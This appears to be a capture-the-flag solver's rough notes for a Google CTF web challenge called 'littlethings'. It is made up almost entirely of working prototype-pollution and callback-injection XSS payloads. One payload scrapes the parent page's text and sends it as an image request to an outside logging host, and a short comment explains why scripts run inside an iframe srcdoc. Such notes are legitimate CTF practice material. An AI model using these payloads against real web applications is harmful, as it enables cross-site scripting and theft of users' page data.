{
    "__proto__": {},
    "theme": {
        "cb": "document.body.firstElementChild.innerHTML=window.name.toString()",
        "html": "document.location.toString()"
    }
}


{
    "__proto__": {},
    "theme": {
        "cb": "document.body.firstElementChild.innerHTML=window.name.slice"
    },
    "i": "<iframe srcdoc='<span id=total><span id=a>//xss.wep.dk/log/5f43ce07ebcf5/</span><span id=b></span></span><img id=img src=x><script src=/theme?cb=window.b.innerText=window.parent.document.body.innerText.slice></script><script src=/theme?cb=window.img.src=window.total.innerText.slice></script>'/>"
}

	{
		"__proto__": {},
		"theme": {
			"cb": "document.body.firstElementChild.innerHTML=window.name.slice"
		},
		"i": "<iframe srcdoc='<script src =/theme?cb=alert>'></iframe>"
	}
	I script inside innerHTML will not execute but script inside srcdoc iframe must execute.
	
	window.location = "https://littlethings.web.ctfcompetition.com/note?__debug__";